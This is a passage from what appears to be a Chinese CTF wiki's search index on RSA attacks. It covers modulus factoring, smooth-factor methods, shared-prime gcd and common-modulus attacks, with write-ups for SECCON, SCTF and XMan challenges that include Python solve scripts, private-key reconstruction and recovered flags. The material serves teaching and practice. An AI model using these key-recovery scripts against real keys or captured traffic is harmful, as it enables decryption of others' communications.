\u9009\u53d6\u4e0d\u5f53\u65f6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q","text":"\u5f53 p-q \u5f88\u5927\u65f6\uff0c\u4e00\u5b9a\u5b58\u5728\u67d0\u4e00\u4e2a\u53c2\u6570\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u4e3a p\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7a77\u4e3e\u7684\u65b9\u6cd5\u5bf9\u6a21\u6570\u8fdb\u884c\u8bd5\u9664\uff0c\u4ece\u800c\u5206\u89e3\u6a21\u6570\uff0c\u5f97\u5230\u4fdd\u5bc6\u53c2\u6570\u4e0e\u660e\u6587\u4fe1\u606f\u3002\u57fa\u672c\u6765\u8bf4\uff0c\u4e0d\u600e\u4e48\u53ef\u884c\u3002","title":"|p-q| \u5f88\u5927"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q_1","text":"\u9996\u5148 \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \u65e2\u7136 |p-q| \u8f83\u5c0f\uff0c\u90a3\u4e48 \\frac{(p-q)^2}{4} \\frac{(p-q)^2}{4} \u81ea\u7136\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u8fdb\u800c \\frac{(p+q)^2}{4} \\frac{(p+q)^2}{4} \u53ea\u662f\u6bd4 N \u7a0d\u5fae\u5927\u4e00\u70b9\uff0c\u6240\u4ee5 \\frac{p+q}{2} \\frac{p+q}{2} \u4e0e \\sqrt{n} \\sqrt{n} \u76f8\u8fd1\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u6cd5\u6765\u5206\u89e3 \u987a\u5e8f\u68c0\u67e5 \\sqrt{n} \\sqrt{n} \u7684\u6bcf\u4e00\u4e2a\u6574\u6570 x\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a x \u4f7f\u5f97 x^2-n x^2-n \u662f\u5e73\u65b9\u6570\uff0c\u8bb0\u4e3a y^2 y^2 \u90a3\u4e48 x^2-n=y^2 x^2-n=y^2 \uff0c\u8fdb\u800c\u6839\u636e\u5e73\u65b9\u5dee\u516c\u5f0f\u5373\u53ef\u5206\u89e3 N","title":"|p-q| \u8f83\u5c0f"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1","text":"\u5f53 p \u662f N \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p - 1 \u662f\u5149\u6ed1\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002 Warning \u539f\u7406\u5206\u6790\u5f85\u5b8c\u6210","title":"p - 1 \u5149\u6ed1"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1_1","text":"\u5f53 p \u662f n \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p + 1 \u662f\u5149\u6ed1\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002","title":"p + 1 \u5149\u6ed1"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#2017-seccon-very-smooth","text":"\u8be5\u7a0b\u5e8f\u7ed9\u4e86\u4e00\u4e2a HTTPS \u52a0\u5bc6\u7684\u6d41\u91cf\u5305\uff0c\u9996\u5148\u4ece\u5176\u4e2d\u62ff\u5230\u8bc1\u4e66 \u279c 2017_SECCON_verysmooth git: ( master ) binwalk -e s.pcap DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 2292 0x8F4 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 4038 0xFC6 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 5541 0x15A5 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 \u279c 2017_SECCON_verysmooth git: ( master ) ls s.pcap _s.pcap.extracted very_smooth.zip \u8fd9\u91cc\u5206\u522b\u67e5\u770b\u4e09\u4e2a\u8bc1\u4e66\uff0c\u4e09\u4e2a\u6a21\u6570\u90fd\u4e00\u6837\uff0c\u8fd9\u91cc\u53ea\u7ed9\u4e00\u4e2a\u4f8b\u5b50 \u279c _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt -pubkey -text -modulus -noout -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy 8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj DUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl yioxCqbXYIMxGO4NcQIDAQAB -----END PUBLIC KEY----- Certificate: Data: Version: 1 (0x0) Serial Number: 11640506567126718943 (0xa18b630c7b3099df) Signature Algorithm: sha256WithRSAEncryption Issuer: C=JP, ST=Kawasaki, O=SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C=JP, ST=Kawasaki, O=SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39 Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71 \u53ef\u4ee5\u770b\u51fa\u6a21\u6570\u53ea\u6709 1024 \u6bd4\u7279\u3002\u800c\u4e14\uff0c\u6839\u636e\u9898\u76ee\u540d very smooth\uff0c\u5e94\u8be5\u662f\u5176\u4e2d\u4e00\u4e2a\u56e0\u5b50\u6bd4\u8f83 smooth\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528 primefac \u5206\u522b\u5c1d\u8bd5 Pollard's p \u2212 1 \u4e0e Williams's p + 1 \u7b97\u6cd5\uff0c\u5982\u4e0b \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs -m = p+1 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 : p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 Z309 = P155 x P155 = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 \u53ef\u4ee5\u53d1\u73b0\u5f53\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u65f6\uff0c\u5c31\u76f4\u63a5\u5206\u89e3\u51fa\u6765\u4e86\u3002\u6309\u9053\u7406\u8fd9\u4e2a\u56e0\u5b50\u662f p-1 \u4f3c\u4e4e\u66f4\u5149\u6ed1\uff0c\u4f46\u662f\u5374\u5e76\u4e0d\u80fd\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u5206\u89e3\uff0c\u8fd9\u91cc\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 : 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 Z154 = P1 x P1 x P2 x P3 x P6 x P142 = 2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 : 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 Z154 = P1^185 x P1^62 x P1^97 = 2 ^185 x 3 ^62 x 5 ^97 \u53ef\u4ee5\u770b\u51fa\uff0c\u5bf9\u4e8e p-1 \u786e\u5b9e\u6709\u5f88\u591a\u5c0f\u56e0\u5b50\uff0c\u4f46\u662f\u4e2a\u6570\u592a\u591a\uff0c\u8fd9\u5c31\u4f1a\u4f7f\u5f97\u8fdb\u884c\u679a\u4e3e\u7684\u65f6\u5019\u51fa\u73b0\u6307\u6570\u7206\u70b8\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u6ca1\u6709\u5206\u89e3\u51fa\u6765\u3002 \u8fdb\u800c\u6839\u636e\u5206\u89e3\u51fa\u6765\u7684\u6570\u6784\u9020\u79c1\u94a5 from Crypto.PublicKey import RSA import gmpy2 def main (): n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L e = 65537L priv = RSA . construct (( n , e , long ( gmpy2 . invert ( e , ( p - 1 ) * ( q - 1 ))))) open ( 'private.pem' , 'w' ) . write ( priv . exportKey ( 'PEM' )) main () \u6700\u540e\uff0c\u5c06\u79c1\u94a5\u5bfc\u5165\u5230 wireshark \u4e2d\u5373\u53ef\u5f97\u5230\u660e\u6587\uff08Edit -> Preferences -> Protocols -> SSL -> RSA Key List\uff09\u3002 < html > < head >< title > Very smooth </ title ></ head > < body > < h1 > Answer: One of these primes is very smooth. </ h1 > </ body > </ html >","title":"2017 SECCON very smooth"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_3","text":"\u5173\u4e8e\u66f4\u591a\u7684\u4e00\u4e9b\u5206\u89e3\u6a21\u6570 N \u7684\u65b9\u6cd5\u53ef\u4ee5\u53c2\u8003 https://en.wikipedia.org/wiki/Integer_factorization \u3002","title":"\u6269\u5c55"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_4","text":"","title":"\u6a21\u4e0d\u4e92\u7d20"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_5","text":"\u5f53\u5b58\u5728\u4e24\u4e2a\u516c\u94a5\u7684 N \u4e0d\u4e92\u7d20\u65f6\uff0c\u6211\u4eec\u663e\u7136\u53ef\u4ee5\u76f4\u63a5\u5bf9\u8fd9\u4e24\u4e2a\u6570\u6c42\u6700\u5927\u516c\u56e0\u6570\uff0c\u7136\u540e\u76f4\u63a5\u83b7\u5f97 p\uff0cq\uff0c\u8fdb\u800c\u83b7\u5f97\u76f8\u5e94\u7684\u79c1\u94a5\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#sctf-rsa2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF rsa2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u76f4\u63a5\u6253\u5f00 pcap \u5305\uff0c\u53d1\u73b0\u6709\u4e00\u5806\u7684\u6d88\u606f\uff0c\u5305\u542b N \u548c e\uff0c\u7136\u540e\u8bd5\u4e86\u8bd5\u4e0d\u540c\u7684 N \u662f\u5426\u4e92\u7d20\uff0c\u6211\u8bd5\u4e86\u524d\u4e24\u4e2a import gmpy2 n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031 n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943 print gmpy2 . gcd ( n1 , n2 ) \u7ed3\u679c\u53d1\u73b0\u7adf\u7136\u4e0d\u4e92\u7d20\u3002 \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py 122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137 \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6765\u89e3\u5bc6\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7b2c\u4e00\u5bf9\u516c\u94a5\u5bc6\u7801\u3002\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031 n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943 p1 = gmpy2 . gcd ( n1 , n2 ) q1 = n1 / p1 e = 65537 phin = ( p1 - 1 ) * ( q1 - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7 plain = gmpy2 . powmod ( cipher , d , n1 ) plain = hex ( plain )[ 2 :] if len ( plain ) % 2 != 0 : plain = '0' + plain print plain . decode ( 'hex' ) \u6700\u540e\u89e3\u5bc6\u5982\u4e0b \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py sH1R3_PRlME_1N_rsA_iS_4ulnEra5le \u89e3\u538b\u538b\u7f29\u5305\u5373\u53ef\u3002","title":"SCTF RSA2"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_6","text":"","title":"\u5171\u6a21\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_7","text":"\u5f53\u4e24\u4e2a\u7528\u6237\u4f7f\u7528\u76f8\u540c\u7684\u6a21\u6570 N\u3001\u4e0d\u540c\u7684\u79c1\u94a5\u65f6\uff0c\u52a0\u5bc6\u540c\u4e00\u660e\u6587\u6d88\u606f\u65f6\u5373\u5b58\u5728\u5171\u6a21\u653b\u51fb\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_8","text":"\u8bbe\u4e24\u4e2a\u7528\u6237\u7684\u516c\u94a5\u5206\u522b\u4e3a e_1 e_1 \u548c e_2 e_2 \uff0c\u4e14\u4e24\u8005\u4e92\u8d28\u3002\u660e\u6587\u6d88\u606f\u4e3a m m \uff0c\u5bc6\u6587\u5206\u522b\u4e3a\uff1a c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N \u5f53\u653b\u51fb\u8005\u622a\u83b7 c_1 c_1 \u548c c_2 c_2 \u540e\uff0c\u5c31\u53ef\u4ee5\u6062\u590d\u51fa\u660e\u6587\u3002\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u51fa re_1+se_2=1\\bmod n re_1+se_2=1\\bmod n \u7684\u4e24\u4e2a\u6574\u6570 r r \u548c s s \uff0c\u7531\u6b64\u53ef\u5f97\uff1a \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*}","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#xman","text":"\u9898\u76ee\u63cf\u8ff0\uff1a {6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773} {6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839} message1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349 message2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535 \u9898\u76ee\u6765\u6e90\uff1aXMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60 \u53ef\u4ee5\u770b\u51fa\u4e24\u4e2a\u516c\u94a5\u7684 N \u662f\u4e00\u6837\u7684\uff0c\u5e76\u4e14\u4e24\u8005\u7684 e \u4e92\u7d20\u3002\u5199\u4e00\u4e2a\u811a\u672c\u8dd1\u4e00\u4e0b\uff1a import gmpy2 n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249 e1 = 773 e2 = 839 message1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349 message2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535 # s & t gcd , s , t = gmpy2 . gcdext ( e1 , e2 ) if s < 0 : s = - s message1 = gmpy2 . invert ( message1 , n ) if t < 0 : t = - t message2 = gmpy2 . invert ( message2 , n ) plain = gmpy2 . powmod ( message1 , s , n ) * gmpy2 . powmod ( message2 , t , n ) % n print plain \u5f97\u5230 \u279c Xman-1-class-exercise git: ( master ) \u2717 python exp.py 1021089710312311910410111011910111610410511010710511610511511211111511510598108101125 \u8fd9\u65f6\u5019\u9700\u8981\u8003\u8651\u5f53\u65f6\u660e\u6587\u662f\u5982\u4f55\u8f6c\u5316\u4e3a\u8fd9\u4e2a\u6570\u5b57\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u662f 16 \u8fdb\u5236\u8f6c\u6362\uff0cASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u6216\u8005 Base64 \u89e3\u5bc6\u3002\u8fd9\u4e2a\u5e94\u8be5\u662f ASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u8fdb\u800c\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u5f97\u5230 flag i = 0 flag = \"\" plain = str ( plain ) while i < len ( plain ): if plain [ i ] == '1' : flag += chr ( int ( plain [ i : i + 3 ])) i += 3 else : flag += chr ( int ( plain [ i : i + 2 ])) i += 2 print flag \u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f7f\u7528 1 \u6765\u5224\u65ad\u662f\u5426\u4e3a\u4e09\u4f4d\u957f\u5ea6\uff0c\u662f\u56e0\u4e3a flag \u4e00\u822c\u90fd\u662f\u660e\u6587\u5b57\u7b26\uff0c\u800c 1 \u5f00\u5934\u7684\u957f\u5ea6\u4e3a 1 \u6216\u8005 2 \u7684\u6570\u5b57\uff0c\u4e00\u822c\u90fd\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26\u3002 flag \u279c Xman-1-class-exercise git: ( master ) \u2717 python exp.py flag { whenwethinkitispossible }","title":"XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_9","text":"Jarvis OJ very hard RSA","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_pkcs_attack/","text":"Bleichenbacher's attack \u00b6 PKCS 1.5 \u6807\u51c6\u4e2d\u53ef\u4ee5\u4f2a\u9020 RSA \u7b7e\u540d\u200b Warning \u5f85\u8865\u5145\u3002 http://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html","title":"Bleichenbacher \u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_pkcs_attack/#bleichenbachers-attack","text":"PKCS 1.5 \u6807\u51c6\u4e2d\u53ef\u4ee5\u4f2a\u9020 RSA \u7b7e\u540d\u200b Warning \u5f85\u8865\u5145\u3002 http://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html","title":"Bleichenbacher's attack"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/","text":"RSA \u4fa7\u4fe1\u9053\u653b\u51fb \u00b6 \u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08\u4fa7\u4fe1\u9053\u653b\u51fb\uff09\u662f\u4e00\u79cd\u80fd\u591f\u4ece\u5bc6\u7801\u8bbe\u5907\u4e2d\u83b7\u53d6\u79d8\u5bc6\u4fe1\u606f\u7684\u5bc6\u7801\u653b\u51fb\u65b9\u6cd5\uff0e\u4e0e\u5176 \u4ed6\u653b\u51fb\u65b9\u6cd5\u4e0d\u540c\uff1a\u8fd9\u79cd\u653b\u51fb\u5229\u7528\u7684\u662f\u5bc6\u7801\u8bbe\u5907\u7684\u80fd\u91cf\u6d88\u8017\u7279\u5f81\uff0c\u800c\u975e\u5bc6\u7801\u7b97\u6cd5\u7684\u6570\u5b66\u7279\u6027\uff0e\u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u4e00\u79cd\u975e\u5165\u4fb5\u5f0f\u653b\u51fb\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u65b9\u4fbf\u5730\u8d2d\u4e70\u5b9e\u65bd\u653b\u51fb\u6240\u9700\u8981\u7684\u8bbe\u5907\uff1a\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u5bf9\u667a\u80fd\u5361\u4e4b\u7c7b\u7684\u5bc6\u7801\u8bbe\u5907\u7684\u5b89\u5168\u6027\u9020\u6210\u4e86\u4e25\u91cd\u5a01\u80c1\u3002 \u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u5b89\u5168\u9886\u57df\u5185\u975e\u5e38\u91cd\u8981\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u53ea\u5728\u8fd9\u91cc\u7b80\u5355\u8ba8\u8bba\u4e0b\u3002 \u80fd\u91cf\u5206\u6790\u653b\u51fb\u5206\u4e3a\uff1a - \u7b80\u5355\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08SPA\uff09\uff0c\u5373\u5bf9\u80fd\u91cf\u8ff9\u8fdb\u884c\u76f4\u89c2\u5206\u6790\uff0c\u8089\u773c\u770b\u5373\u53ef\u3002 - \u5dee\u5206\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08DPA\uff09\uff0c\u57fa\u4e8e\u80fd\u91cf\u8ff9\u4e4b\u95f4\u7684\u76f8\u5173\u7cfb\u6570\u8fdb\u884c\u5206\u6790\u3002 \u653b\u51fb\u6761\u4ef6 \u00b6 \u653b\u51fb\u8005\u53ef\u83b7\u53d6\u4e0e\u52a0\u89e3\u5bc6\u76f8\u5173\u7684\u4fa7\u4fe1\u9053\u4fe1\u606f\uff0c\u4f8b\u5982\u80fd\u91cf\u6d88\u8017\u3001\u8fd0\u7b97\u65f6\u95f4\u3001\u7535\u78c1\u8f90\u5c04\u7b49\u7b49\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 HITB 2017 \u7684 Hack in the card I \u4f5c\u4e3a\u4f8b\u5b50\u3002 \u9898\u76ee\u7ed9\u51fa\u4e86\u516c\u94a5\u6587\u4ef6 publickey.pem \uff0c\u5bc6\u6587\uff0c\u6d4b\u91cf\u667a\u80fd\u5361\u529f\u7387\u7684\u7535\u8def\u56fe\uff0c\u548c \u89e3\u5bc6 \u8fc7\u7a0b\u4e2d\u667a\u80fd\u5361\u6d88\u8017\u7684\u529f\u7387\u53d8\u5316\uff08\u901a\u8fc7\u5728\u7ebf\u7f51\u7ad9\u7ed9\u51fa trace \uff09\u3002 \u200b \u5bc6\u6587\uff1a 